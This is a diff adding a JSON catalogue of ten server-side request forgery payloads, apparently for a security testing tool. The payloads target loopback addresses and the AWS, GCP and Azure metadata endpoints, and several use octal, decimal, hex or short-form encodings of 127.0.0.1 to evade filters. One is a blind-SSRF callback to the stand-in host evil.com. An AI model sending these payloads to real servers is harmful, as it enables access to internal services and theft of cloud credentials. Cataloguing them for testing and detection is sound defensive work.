@@ -1,0 +1,102 @@
+[
+  {
+    "id": "ssrf-001",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://127.0.0.1",
+    "context": "url",
+    "description": "Basic SSRF targeting local loopback",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-002",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://localhost",
+    "context": "url",
+    "description": "SSRF targeting localhost",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-003",
+    "family": "ssrf",
+    "subtype": "cloud_metadata",
+    "payload_string": "http://169.254.169.254/latest/meta-data/",
+    "context": "url",
+    "description": "SSRF targeting AWS EC2 metadata endpoint",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {"aws": true}
+  },
+  {
+    "id": "ssrf-004",
+    "family": "ssrf",
+    "subtype": "cloud_metadata",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/",
+    "context": "url",
+    "description": "SSRF targeting GCP metadata endpoint",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {"gcp": true}
+  },
+  {
+    "id": "ssrf-005",
+    "family": "ssrf",
+    "subtype": "cloud_metadata",
+    "payload_string": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "context": "url",
+    "description": "SSRF targeting Azure metadata endpoint",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {"azure": true}
+  },
+  {
+    "id": "ssrf-006",
+    "family": "ssrf",
+    "subtype": "blind",
+    "payload_string": "http://evil.com/ssrf-callback",
+    "context": "url",
+    "description": "Blind SSRF with out-of-band callback",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-007",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://0177.0.0.1",
+    "context": "url",
+    "description": "SSRF using octal IP encoding for 127.0.0.1",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-008",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://2130706433",
+    "context": "url",
+    "description": "SSRF using decimal IP encoding for 127.0.0.1",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-009",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://0x7f.0x00.0x00.0x01",
+    "context": "url",
+    "description": "SSRF using hexadecimal IP encoding for 127.0.0.1",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  },
+  {
+    "id": "ssrf-010",
+    "family": "ssrf",
+    "subtype": "basic",
+    "payload_string": "http://127.1",
+    "context": "url",
+    "description": "SSRF using short-form IP notation",
+    "references": ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+    "platform_specific": {}
+  }
+]
